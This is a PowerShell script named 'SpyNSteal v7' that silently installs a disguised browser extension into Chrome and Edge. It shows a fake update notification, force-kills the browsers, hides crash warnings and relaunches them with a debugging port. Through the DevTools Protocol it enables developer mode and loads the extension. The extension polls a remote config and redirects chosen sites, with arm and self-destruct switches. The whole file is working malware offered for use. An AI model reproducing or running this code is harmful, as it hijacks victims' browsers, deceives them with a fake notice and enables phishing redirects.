# SpyNSteal v7 - CDP-based extension loading
# Uses Chrome DevTools Protocol to call chrome.developerPrivate.loadUnpacked()
# This is the same API chrome://extensions uses when you click "Load unpacked"

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Send-WS($ws, [string]$text) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($text)
    $seg = New-Object System.ArraySegment[byte]($bytes, 0, $bytes.Length)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
}

function Recv-WS($ws, [int]$timeoutMs = 15000) {
    $buf = New-Object byte[] 131072
    $all = New-Object System.Collections.Generic.List[byte]
    $deadline = [DateTime]::Now.AddMilliseconds($timeoutMs)
    do {
        $seg = New-Object System.ArraySegment[byte]($buf, 0, $buf.Length)
        $task = $ws.ReceiveAsync($seg, [System.Threading.CancellationToken]::None)
        $remaining = ($deadline - [DateTime]::Now).TotalMilliseconds
        if ($remaining -le 0) { return $null }
        if (-not $task.Wait([int]$remaining)) { return $null }
        $count = $task.Result.Count
        for ($i = 0; $i -lt $count; $i++) { $all.Add($buf[$i]) }
    } while (-not $task.Result.EndOfMessage)
    return [Text.Encoding]::UTF8.GetString($all.ToArray())
}

function Invoke-CDP($ws, [int]$id, [string]$method, $params) {
    $cmd = @{ id = $id; method = $method }
    if ($params) { $cmd.params = $params }
    $json = $cmd | ConvertTo-Json -Depth 10 -Compress
    Send-WS $ws $json

    $deadline = [DateTime]::Now.AddSeconds(20)
    while ([DateTime]::Now -lt $deadline) {
        $text = Recv-WS $ws 15000
        if (-not $text) { return $null }
        try {
            $obj = $text | ConvertFrom-Json
            if ($obj.PSObject.Properties["id"] -and $obj.id -eq $id) { return $obj }
        } catch {}
    }
    return $null
}

function Install-ViaDevTools([string]$browserExe, [string]$browserName, [string]$extDir, [int]$port) {
    Log "--- CDP install for $browserName on port $port ---"

    Log "Launching $browserName with debug port $port..."
    try {
        Start-Process -FilePath $browserExe -ArgumentList "--remote-debugging-port=$port","--restore-last-session"
    } catch {
        Log "Failed to launch: $_"
        return $false
    }

    # Wait for debug endpoint
    $debugUrl = "http://localhost:$port"
    $ready = $false
    for ($i = 0; $i -lt 40; $i++) {
        Start-Sleep -Milliseconds 500
        try {
            $ver = (New-Object System.Net.WebClient).DownloadString("$debugUrl/json/version")
            if ($ver) { $ready = $true; break }
        } catch {}
    }
    if (-not $ready) { Log "Debug endpoint not ready after 20s"; return $false }
    Log "Debug endpoint ready"

    # Open chrome://extensions tab via CDP HTTP
    Start-Sleep 1
    $tabJson = $null
    try {
        $tabJson = (New-Object System.Net.WebClient).DownloadString("$debugUrl/json/new?chrome://extensions")
    } catch {
        Log "Failed to create extensions tab: $_"
        return $false
    }
    $tabInfo = $tabJson | ConvertFrom-Json
    $wsUrl = $tabInfo.webSocketDebuggerUrl
    Log "Extensions tab created, WS: $wsUrl"

    # Wait for chrome://extensions to fully load
    Start-Sleep 4

    # Connect WebSocket
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    try {
        $ws.ConnectAsync([Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
    } catch {
        Log "WebSocket connect failed: $_"
        return $false
    }
    Log "WebSocket connected"

    # Wait for chrome.developerPrivate API to be available
    $apiReady = $false
    for ($try = 0; $try -lt 5; $try++) {
        $check = Invoke-CDP $ws (10 + $try) "Runtime.evaluate" @{
            expression = "(typeof chrome !== 'undefined' && typeof chrome.developerPrivate !== 'undefined').toString()"
            returnByValue = $true
        }
        if ($check -and $check.result -and $check.result.result -and $check.result.result.value -eq "true") {
            $apiReady = $true
            break
        }
        Log "API not ready yet, retry $try..."
        Start-Sleep 2
    }
    if (-not $apiReady) {
        Log "developerPrivate API never became available"
        try { $ws.Dispose() } catch {}
        return $false
    }
    Log "developerPrivate API ready"

    # Enable developer mode
    $devResult = Invoke-CDP $ws 20 "Runtime.evaluate" @{
        expression = "new Promise(function(resolve) { chrome.developerPrivate.setProfileConfiguration({inDeveloperMode: true}, function() { resolve('devmode_on'); }); })"
        awaitPromise = $true
        returnByValue = $true
    }
    $devVal = ""
    if ($devResult -and $devResult.result -and $devResult.result.result) {
        $devVal = $devResult.result.result.value
    }
    Log "Developer mode result: $devVal"

    # Load the unpacked extension
    $escapedPath = $extDir.Replace('\', '/')
    $loadExpr = "new Promise(function(resolve, reject) { chrome.developerPrivate.loadUnpacked({path: '$escapedPath'}, function(result) { if (chrome.runtime.lastError) { reject(new Error(chrome.runtime.lastError.message)); } else { resolve(result ? JSON.stringify(result) : 'loaded'); } }); })"

    $loadResult = Invoke-CDP $ws 30 "Runtime.evaluate" @{
        expression = $loadExpr
        awaitPromise = $true
        returnByValue = $true
    }

    $loadVal = ""
    $loadErr = ""
    if ($loadResult) {
        if ($loadResult.result -and $loadResult.result.result) {
            $loadVal = $loadResult.result.result.value
        }
        if ($loadResult.result -and $loadResult.result.exceptionDetails) {
            $loadErr = $loadResult.result.exceptionDetails.exception.description
            if (-not $loadErr) { $loadErr = $loadResult.result.exceptionDetails.text }
        }
    }
    Log "Load result: $loadVal"
    if ($loadErr) { Log "Load error: $loadErr" }

    # Close WebSocket
    try {
        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
    } catch {}
    $ws.Dispose()

    # Close the chrome://extensions tab
    Start-Sleep 1
    try {
        (New-Object System.Net.WebClient).DownloadString("$debugUrl/json/close/$($tabInfo.id)") | Out-Null
    } catch {}
    Log "Extensions tab closed"

    $success = ($loadVal -and -not $loadErr)
    Log "Install success: $success"
    return $success
}

# ============================================================================
#  MAIN
# ============================================================================
Log "=== SpyNSteal v7 (CDP) ==="

# Write extension files
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension files written to: $extDir"

# Detect browsers
$browsers = @()
foreach ($name in @("chrome", "edge")) {
    $b = Find-Browser $name
    Log "Browser '$name': Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers found"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }

# Show fake update notification
if ($wasRunning.Count -gt 0) {
    Show-UpdateNotif $wasRunning[0]
}

# Kill ALL browser processes aggressively
foreach ($b in $browsers) {
    for ($k = 0; $k -lt 20; $k++) {
        $procs = Get-Process $b.Proc -EA SilentlyContinue
        if (-not $procs) { break }
        $procs | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    Log "$($b.Proc) dead: $(-not [bool](Get-Process $b.Proc -EA SilentlyContinue))"
}

# Patch Local State to suppress crash warnings
foreach ($b in $browsers) { Patch-LocalState $b.UserData }

Start-Sleep 1

# Install extension via CDP for each browser that was running (or Chrome by default)
$targets = $wasRunning
if ($targets.Count -eq 0) { $targets = @($browsers[0]) }

$port = 19222
foreach ($b in $targets) {
    $ok = Install-ViaDevTools $b.ExePath $b.Name $extDir $port
    Log "CDP install $($b.Name): $ok"
    $port++
}

Log "=== Done ==="
